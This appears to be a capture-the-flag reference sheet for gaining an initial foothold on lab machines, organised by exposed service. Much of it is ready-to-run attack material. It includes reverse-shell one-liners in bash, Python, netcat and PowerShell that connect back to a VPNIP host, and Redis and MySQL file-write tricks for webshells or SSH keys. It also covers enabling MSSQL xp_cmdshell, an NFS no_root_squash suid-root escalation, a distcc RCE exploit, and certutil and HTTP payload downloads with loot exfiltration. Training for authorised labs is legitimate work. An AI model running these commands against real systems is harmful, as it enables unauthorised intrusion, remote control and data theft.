# Foothold by service

Order of preference: web app bug > known CVE on exposed service version >
misconfiguration (anonymous/writable/default creds) > cred reuse. Web app
techniques live in `ctf-web`; this file covers everything after the port scan.

## Catching the shell (set up first)

```bash
nc -lvnp 9001                      # on this host, VPN IP
rlwrap nc -lvnp 9001               # nicer: arrow keys, history
```

Your VPN IP: `ip a show <vpn-iface>` — record it in notes.md.

## By-service entry table

| Service | Entry attempt | Notes |
|---|---|---|
| Web 80/443/8080 | source audit, known CMS/plugin CVEs, upload, RCE | skill `ctf-web` |
| Old daemon any port | `searchsploit <svc> <version>` | see below |
| FTP 21 | anonymous + writable dir → upload reverse trigger (webroot symlink, planned exec) | `put` then trigger via web/cron if reachable |
| SMB 445 | share browse; writable share + scheduled task/autorun file; `impacket-smbexec` with creds | enumerate with `smbclient -L -N`, `enum4linux-ng` |
| NFS 2049 | `showmount -e <target>`; mount, abuse `no_root_squash` | trick below |
| distcc 3632 | `distccd` RCE (CVE-2004-2687): `msfconsole > use exploit/unix/misc/distcc_exec` | any unauth compile/exec service: same shape |
| MySQL 3306 | creds → `SELECT ... INTO OUTFILE` webshell if DB root + known webroot; UDF lib RCE | foothold.md UDF rare, try file write first |
| MongoDB 27017 | unauth → dump users collection for password reuse | `mongosh`, `db.getCollectionNames()` |
| Redis 6379 | unauth write: webshell via `CONFIG SET dir <webroot>` + `SET`/`SAVE`; or SSH key: `CONFIG SET dir ~/.ssh` + `SET x "\n\nssh-rsa ...\n\n"` + `CONFIG SET dbfilename authorized_keys` + `SAVE` | classic redis-as-file-writer |
| MSSQL 1433 | creds → `EXEC xp_cmdshell 'whoami'`; re-enable: `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` | `impacket-mssqlclient` |
| SSH 22 | key reuse (found keys), user enumeration (timing on valid vs invalid user with password attempts) | not usually the way in |
| RDP 3389 | only with found creds; `xfreerdp /u: /p: /v:` | check `cmdkey /list` loot |
| WinRM 5985/5986 | found creds → `evil-winrm -i <target> -u <user> -p <pw>` (pacman `evil-winrm`) | best Windows shell when creds exist |
| SNMP 161 | `snmpwalk` → creds, paths, sometimes write (`rw-community`) | recon.md |

## searchsploit on ancient versions

```bash
sudo pacman -S exploitdb          # once; provides searchsploit + exploits db
searchsploit apache 2.2           # service + version keywords
searchsploit -m 12345             # mirror exploit #12345 into cwd
```

Mirrored exploits are untrusted code — read before running; compile/execute on
the target or under `podman`, never host-sudo. Web search remains the fallback
for version-specific PoCs; record the exact version string from nmap.

## NFS no_root_squash

```bash
showmount -e <target>
sudo mkdir /mnt/nfs && sudo mount -t nfs <target>:/<share> /mnt/nfs
# on the share: copy a suid-root binary and make it suid as root here
cp /bin/bash /mnt/nfs/pwn && chmod +s /mnt/nfs/pwn    # our root == their root
# on the box: /mnt/<share>/pwn -p
```

Works only when the export has `no_root_squash` (default in many lab setups).
If the export allows mounting but squashes root, look for creds/keys on it
instead.

## Shell stabilization (always, before anything else)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # or python -c on old boxes
Ctrl-Z
stty raw -echo; fg                                # on YOUR terminal
export TERM=xterm SHELL=/bin/bash; stty rows 40 cols 120
```

| Situation | Upgrade |
|---|---|
| python3 present | pty.spawn one-liner above |
| socat on target | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<VPNIP>:9002` with `socat TCP-LISTEN:9002,reuseaddr -` locally |
| no python/socat | keep rlwrap'd nc; script each command |
| Windows | no tty concept; use `evil-winrm` or a meterpreter if allowed |

## Reverse shells (replace VPNIP/PORT)

```bash
bash -i >& /dev/tcp/VPNIP/9001 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("VPNIP",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc VPNIP 9001 >/tmp/f     # when nc has no -e
nc -e /bin/sh VPNIP 9001                                                        # traditional nc
```

```powershell
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('VPNIP',9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$o=[text.encoding]::ASCII.GetBytes($r2);$s.Write($o,0,$o.Length);$s.Flush()};$c.Close()"
```

Base64-wrap long PowerShell when quotes get mangled:
`pwsh -enc` / `powershell -enc <b64-of-UTF16LE-command>` (generate with
`iconv -f UTF-8 -t UTF-16LE cmd.txt | base64 -w0`).

## File transfer

| Direction | Command |
|---|---|
| Host → target (any shell) | `python3 -m http.server 8000` in the dir, then on target `curl -O http://VPNIP:8000/<f>` or `wget http://VPNIP:8000/<f>` |
| Host → Windows target | `certutil -urlcache -f http://VPNIP:8000/p.exe p.exe` |
| Host → target via SMB | `uv pip install --python .venv/bin/python impacket` then `.venv/bin/impacket-smbserver share .` on host; target: `copy \\\\VPNIP\\share\\p.exe` (Windows) or `mount -t cifs //VPNIP/share /mnt` |
| Target → host (exfil loot) | `scp file user@VPNIP:/path/` (needs our sshd), or python http.server on target + `curl -O` on host, or `impacket-smbserver` + push |

The impacket pip package installs its example tools as console scripts — after
install they live at `.venv/bin/impacket-smbserver`, `.venv/bin/impacket-psexec`,
`.venv/bin/impacket-secretsdump`, etc. (run via `scripts/ctf` or the full path).

## Immediately after foothold

1. `id` / `whoami`; `uname -a` or `systeminfo` — write it in notes.md.
2. Grab the flag nearest you (`user.txt`), log it.
3. Stabilize the shell, tar the webroot if it exists (KOTH insurance).
4. Upload the enum script / peas → jump to `references/privesc-linux.md` or
   `references/privesc-windows.md`.
